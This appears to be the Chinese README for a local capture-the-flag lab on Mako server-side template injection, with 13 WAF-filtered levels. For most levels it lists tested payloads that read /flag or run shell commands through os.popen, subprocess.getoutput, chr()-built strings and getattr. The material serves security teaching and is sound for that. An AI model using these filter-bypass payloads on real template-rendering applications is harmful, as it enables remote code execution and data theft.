# 03 · Mako 13 关 WAF 链

| | |
|---|---|
| 端口 | `8093`（`MAKO_CHAIN_PORT` 可改） |
| 引擎 | Mako（`mako.template.Template(...).render()`） |
| 关卡数 | 13（id `0`–`12`） |
| 依赖网络 | 否 |
| flag | 容器内 `/flag`，由环境变量写入 |

## 这个靶场在教什么

与 `02-jinja-chain` **同构的 13 关**，但目标是 Mako。放在一起看才有意义：
同样一句「禁止引号」，在两个引擎里能用的替代语法面完全不同。

Mako 与 Jinja 的差别不是「语法糖不同」，而是**求值模型不同**：

| | Jinja2 | Mako |
|---|---|---|
| 模板怎么执行 | 编译成 Python 函数 | **编译成 Python 模块**再执行 |
| 表达式 | `{{ ... }}`（受限的表达式子集） | `${ ... }`（**原生 Python 表达式**） |
| 代码块 | 无（只有 `{% call %}` 之类宏） | `<% ... %>` 函数体、`<%! ... %>` **模块级**代码 |
| 写输出 | 只能靠 `{{ }}` / `{% print %}` | `${ }`、`context.write()`、`self.write()` 都能写 |
| 循环/条件 | `{% for %}` / `{% if %}` | `% for` / `% if`（行控制）+ 原生 Python |

**结论**：Jinja 关里「定界符被封 = 输出被封」，Mako 关里不是。
`${` 被拦之后，`<% %>` 这一整片语法面仍然可以**执行任意 Python 并写输出**。
这就是本靶场第一条教学点，也是它和 Jinja 关最大的难度差。

第二条教学点：**渲染器主动注入了与 Flask 同构的上下文**，所以 Mako 关也能走
和 Jinja 关同构的 gadget 链，便于对照。实测某关卡的 `context.keys()`：

```text
['request', 'session', 'g', 'url_for', 'get_flashed_messages', 'config',
 'lipsum', 'cycler', 'joiner', 'namespace', 'capture', 'caller', 'self', 'local']
```

前 10 个来自 `ssti_core/engines/mako.py` 的 `_flask_context()`（`request` / `session` /
`g` / `url_for` / `get_flashed_messages` / `config` + Jinja 的 `lipsum` / `cycler` /
`joiner` / `namespace`），后 4 个是 Mako 自己的模板命名空间。

## 关卡表

| id | 关卡 | 过滤内容 | 关键思路 |
|----|------|----------|----------|
| 0 | L1 无过滤 | — | `${7*7}`；`${open('/flag').read()}`；`<%! import os %>` |
| 1 | L2 拦截 `${` | 子串 `${` | `<% %>` 代码块 + `context.write()`，整片语法面还在 |
| 2 | L3 盲编译/渲染 | 无过滤，只回显 `correct`/`wrong` | 语法错误也落进 `wrong`；把数据变成成功/失败 |
| 3 | L4 禁止方括号 | `[` `]` | 直接读全文，不要切片；`__subclasses__()` 后别用下标 |
| 4 | L5 禁止引号 | `'` `"` | `chr(47)+chr(102)+...` 逐字节拼路径 |
| 5 | L6 禁止下划线 | `_` | 上一条的 `chr()` 链本来就不需要下划线 |
| 6 | L7 禁止点号 | `.` | `getattr(obj, chr(...))()` 完全替代 `obj.attr()` |
| 7 | L8 关键字黑名单 | 12 个子串（大小写敏感） | `__import__(chr(...)).getoutput(chr(...))`；别用 `popen` |
| 8 | L9 禁止数字 | `0`–`9` | `True` / `len(())` 拼整数；或换不需要数字的语法面 |
| 9 | L10 前缀空分支 | 载荷前拼 `% if False:\n% endif\n` | 前缀是合法 Mako 行语法，照常写载荷 |
| 10 | L11 组合过滤 | `' " + . [ ]` 与 `request` | `chr` 造字节、`getattr` 替代点号；**硬关** |
| 11 | L12 强字符集 | 再加 `_`、数字、`\` | **CTF 硬关**：`<%! %>` 模块块仍可 `import` |
| 12 | L13 扩展关键字 | 符号 + `request/class/init/arg/config/app/self` | **CTF 硬关**：`<%!import os%>${os}` 仍能过 |

表格里的过滤内容逐字取自 `shared/ssti_core/levels/mako.py` 的 `WafSpec`，
可用 `GET /api/god/source?level=<id>` 或前端「关卡源码」按钮当场核对。

## 参考解

下面标注「✅ 实测」的 payload 全部经 `POST /api/render`（`mode=god`）在
`labs/03-mako-chain` 镜像上实际执行过，输出为观测原文；flag 来自
`-e STATIC_FLAG='flag{doc_probe}'`（容器内 `cat /flag` → `flag{doc_probe}`）。

### L1（id 0）无过滤 ✅

```mako
${7*7}                                              → 49
${open('/flag').read().strip()}                     → flag{doc_probe}
<%!
import os
%>
${os.popen('id').read()}                            → uid=0(root) gid=0(root) groups=0(root)
```

`<%! %>` 是**模块级**代码：它只在模板模块首次编译时执行一次，变量在整个模板里可见。
这是 Mako 最短的 RCE 路径（比 Jinja 的 `lipsum.__globals__` 链短得多）。

### L2（id 1）拦截 `${` ✅

被拦的是**插值定界符**，不是 Python 能力。代码块 + `context.write()`：

```mako
<%
import os
context.write(os.popen('id').read())
%>                                                  → uid=0(root) gid=0(root) groups=0(root)

<%context.write(open('/flag').read())%>              → flag{doc_probe}
<%context.write(__import__('os').popen('id').read())%>  → uid=0(root) gid=0(root) groups=0(root)
```

注意 `<%! import os %>` 这种**模块级 + `${}` 输出**的组合会被拦（因为载荷里有 `${`），
所以这一关必须把输出也搬进代码块里。

### L3（id 2）盲编译/渲染 ✅

只有 `ok` 这一个信号（见 `docs/API.md` §6 第 1 条）。Mako 会把模板编译成
Python，所以**语法错误同样落进 `wrong`** —— 这天然是一个布尔信道：

```mako
hello                    → ok:true,  output:"correct"（raw_output:"hello"）
${1/+}                   → ok:false, output:"wrong"（error:"SyntaxException: ... invalid syntax"）
${open('/flag').read()}  → ok:true,  output:"correct"（raw_output:"flag{doc_probe}"，仅上帝模式可见）
```

### L4（id 3）禁止方括号 ✅

不要切片（`[:n]` 含方括号），直接读全文：

```mako
${open('/flag').read()}                             → flag{doc_probe}
${open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)).read()}  → flag{doc_probe}（同关也可用 chr 路线）
```

### L5（id 4）禁止引号 ✅

字符串字面量写不了，`chr()` 逐字节拼：

```mako
${open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)).read()}   → flag{doc_probe}
${__import__(chr(111)+chr(115)).popen(chr(105)+chr(100)).read()}  → uid=0(root) gid=0(root) groups=0(root)
${__import__(chr(111)+chr(115)).popen(chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)).read()}
                                                     → flag{doc_probe}
```

> 因为 `${ }` 里是**原生 Python**，这里可以直接用 `__import__` / `open` / `chr`，
> 不需要任何 gadget 链 —— 这一点和 Jinja 关完全不同。

### L6（id 5）禁止下划线 ✅

魔术属性写不了，但「`open` + `chr` 拼串」这条链**本来就不含下划线标识符**：

```mako
${open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)).read()}   → flag{doc_probe}
<%context.write(open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)).read())%>  → flag{doc_probe}
```

```mako
${__import__(chr(111)+chr(115)).popen(chr(105)+chr(100)).read()}   → WAF
```

最后一条会被拦，原因不在下划线：**`popen` 是 L8 才禁的**，但 `_` 这一关禁的是
单个下划线字符 —— 而这条载荷含有 `__import__` 里的下划线。要过 L6 就别用
带下划线的标识符。

### L7（id 6）禁止点号 ✅

`getattr(obj, name)` 完全替代 `obj.name()`：

```mako
${getattr(open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)),chr(114)+chr(101)+chr(97)+chr(100))()}
                                                     → flag{doc_probe}
```

三层 `getattr` 也成立（实测取到 `__call__`）：

```mako
${getattr(getattr(getattr(open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)),chr(114)+chr(101)+chr(97)+chr(100)),chr(95)+chr(95)+chr(99)+chr(97)+chr(108)+chr(108)+chr(95)+chr(95)),chr(95)+chr(95)+chr(110)+chr(97)+chr(109)+chr(101)+chr(95)+chr(95))}
                                                     → __call__
```

注意 Mako 不像 Python 那样支持 `obj['attr']`：`open(...)[1]` 报的是
`TypeError: '_io.TextIOWrapper' object is not subscriptable`，所以这一关
**只能**靠 `getattr`。

### L8（id 7）关键字子串黑名单 ✅

被禁：`class` `arg` `form` `value` `data` `request` `init` `global` `open` `mro` `base` `attr`（大小写敏感）。

```mako
${open(chr(47)+...).read()}                          → WAF（命中 `open`）
${getattr(1,2)}                                      → WAF（命中 `attr`）
${__import__(chr(111)+chr(115)).popen(...).read()}   → WAF（`popen` 也被禁）
```

绕法用 `subprocess.getoutput` —— 这个名字里没有任何被禁子串：

```mako
${__import__(chr(115)+chr(117)+chr(98)+chr(112)+chr(114)+chr(111)+chr(99)+chr(101)+chr(115)+chr(115)).getoutput(chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103))}
                                                     → flag{doc_probe}
```

即 `__import__(chr(...)).getoutput(chr(...))`。`getoutput` 用的是 `/bin/sh`，
所以 `cat /flag` 里的空格要写成 `chr(32)`。

### L9（id 8）禁止数字 ✅

`chr(47)` 这类写法作废，但整数可以现造：

```mako
${7*7}        → WAF（含数字）
${True+True}  → 2        （bool 在 Python 里就是 int）
${len('abcd')}→ 4
```

关键是**未必要造数字**：`open('/flag').read()` 这条链一个数字都不需要，
直接就是答案（实测输出 `flag{doc_probe}`）。要把 `chr()` 链搬到这一关，
才需要先用 `True`/`len(())`/位移凑出 `47`、`102` 这些字节值。

### L10（id 9）前缀空分支 ✅

服务端在载荷**前面**拼 `% if False:\n% endif\n`。它不拦你，只改变模板起始上下文：

```mako
hello                  → hello
${7*7}                 → 49
${open('/flag').read()}→ flag{doc_probe}
```

`template_after_waf` 里能看到前缀确实被拼上了。前缀本身是合法 Mako 行语法；
它没有缩进载荷，所以照常写就行。

### L11（id 10）组合过滤 —— 硬关

过滤：`'` `"` `+` `.` `[` `]` 与子串 `request`。

实测（全部 **未拿到 flag**，仅记录边界）：

| 载荷 | 结果 |
|------|------|
| `${open('/flag').read()}` | `WAF`（引号） |
| `${open(chr(47)+chr(102)+...).read()}` | `WAF`（`+`） |
| `${request.args}` | `WAF`（`request`） |
| `${chr}` | `<built-in function chr>` —— **`chr` 这个内置名本身可用** |
| `${chr(len(bytes()))}` | `\x00`（说明 `chr()` + 无数字整数构造是通的） |
| `${open(chr(len(bytes())))}` | 抛 `ValueError: embedded null byte` |
| `<%context.write(chr(len(bytes())))%>` | `WAF`（代码块里也不能有引号） |
| `<%!o=chr%>${o}` | `<built-in function chr>`（模块块可用） |

即：**函数调用、圆括号、逗号、`True`/`bytes()` 都还活着**，缺的是「造字符串」和
「取属性」的手段，而 `chr` 只接受整数、整数又得先有……这一关需要一条较长的
无引号/无加号/无方括号整数与字符串构造链，**本仓库目前没有已验证的短解**。
`D:\github\ssti\ref-lab\docs\MAKO_SOLUTIONS.md` 对同构关卡也只给了方向。

### L12（id 11）强字符集 —— 硬关

过滤：`_` `.` `0-9` `\` `'` `"` `[` `]`。实测：

| 载荷 | 结果 |
|------|------|
| `${7*7}` / `${True+True}` | `WAF`（数字或 `+`） |
| `${True}` | `True` |
| `${chr}` | `<built-in function chr>` |
| `${len(bytes())}` | `0` |
| `<%!import os%>` | 空输出、**不报错**（模块块可用！） |
| `<%!x=chr%>${x(65)}` | `WAF`（数字 `65`） |
| `${open}` | `<built-in function open>` |

本关**唯一确认可用的语法面是 `<%! %>` 模块级代码块**：下划线只禁「模板源码里的 `_`
字符」，而 `<%!import os%>` 一个下划线都不含。难点同样回到「模块名与路径都必须是
合法 Python 字面量，但不能带引号和数字」，所以完整解仍未验证。

### L13（id 12）扩展关键字与符号 —— 硬关

过滤：符号 `_ . \ ' " + [ ]` 与子串 `request` `class` `init` `arg` `config` `app` `self`。
实测：

| 载荷 | 结果 |
|------|------|
| `${7*7}` | `49` |
| `${True}` | `True` |
| `${chr}` | `<built-in function chr>` |
| `${lipsum}` / `${session}` / `${g}` | 可用（`lipsum` / `session` / `g` 都不在黑名单里） |
| `${config}` / `${self}` / `${app}` | `WAF`（子串 `config` / `self` / `app` 命中） |
| `${url_for}` | 未在 id 12 上单独实测（id 10 上可用） |
| `<%!import os%>` | 空输出、不报错 |
| **`<%!import os%>${os}`** | **`<module 'os' (frozen)>`** ✅ |
| `<%context.write(True)%>` | `WAF`（`context.write` 含 `.`） |

**本关是「有短解」的**：`<%!import os%>${os}` 实测通过，说明模块级代码块
把 `os` 绑定进了模板命名空间，而 `${os}` 本身不含任何被禁字符（`os` 不在子串表里）。
从这一步出发，只差「把字符串字面量问题绕过去」（例如用 `${os.listdir()}` 无参调用
配合模块块里预先绑好的常量）—— 这条延续链本仓库尚未验证，**不在此处给出未实测的 payload**。

### 小结

| 难度带 | 关卡 | 状态 |
|--------|------|------|
| 有短解、已实测 | id 0–10（除 2 为盲关） | ✅ 见上表 |
| 结构性硬关、仅确认语法面 | id 10（组合过滤） | ⚠️ 短解未验证 |
| 结构性硬关、已找到入口 | id 11、id 12 | ⚠️ 仅 `<%! %>` 入口已验证，完整读 flag 链未验证 |

这三关是**刻意设计**的。建议的练习方式：

1. 开上帝模式，先提交一个最小载荷，看 `template_after_waf`、`error`、`exception_type`
   —— 先分清「是 WAF 拦的」还是「载荷本身语法错」。
2. 逐项确认「我这一关最先失去的是哪一种表达能力」：字符串？属性名？整数？
3. 用剩下的语法面重建它。Mako 关里永远先问一句：**`<%! %>` 还能不能用？**

如果你希望 id 10–12 在默认 Python 3.11 下**必有短解**，需要放宽对应的 `WafSpec`
（改 `shared/ssti_core/levels/mako.py` 里那一关的规则），改完请同步更新本文件的表格
与 `scripts/verify_labs.py` 里的探针。

## 运行

```bash
# 1) 先构建统一前端镜像（只需一次）
scripts/build-frontend.sh            # Windows: scripts\build-frontend.ps1

# 2) 起靶场
cd labs/03-mako-chain
docker compose up --build            # → http://127.0.0.1:8093

# 或在仓库根目录一次起全部（01–07；08 需要 --profile java）
scripts/up-all.sh                    # Windows: scripts\up-all.ps1
```

## 直接调 API

```bash
curl -s localhost:8093/api/lab-info | jq '.levels[7]'
curl -s -X POST localhost:8093/api/render \
     -H 'Content-Type: application/json' \
     -d '{"level":"0","mode":"god","template":"${7*7}"}' | jq
```

带引号的载荷建议写进 JSON 文件再 `--data-binary @payload.json`，避免 shell 引号问题。

## 上帝模式（出题人视角）

`mode=god` 额外返回 `template_after_waf` / `raw_output` / `error` / `exception_type` /
`waf_blocked` / `source_class`（字段语义见 `docs/API.md` §6）。在 L10 这种
「前缀污染型」关卡里，`template_after_waf` 是唯一能直接看到前缀被拼接的证据。

前端的 **关卡源码** 按钮调 `/api/god/source?level=<id>`，直接显示那一关的
`WafSpec` 定义 —— 出题改规则、复盘确认规则都比读文档快。

## 出题提示

- 这一关的教学价值高度依赖「渲染器注入了 Flask 同构上下文」。如果哪天把
  `ssti_core/engines/mako.py` 的 `_flask_context()` 删了，Mako 关会退化成
  「Mako 语法练习」，与 Jinja 关失去对照意义。
- 想让难度曲线更平滑，可以把 id 10–12 的规则拆成「只禁引号」「只禁加号」两档，
  每档都保留一条短解；现在的设计是直接跳到 CTF 硬关。
- 改完任何 `WafSpec` 后跑一次 `python scripts/verify_labs.py 03`，
  探针里的期望值需要一起更新。
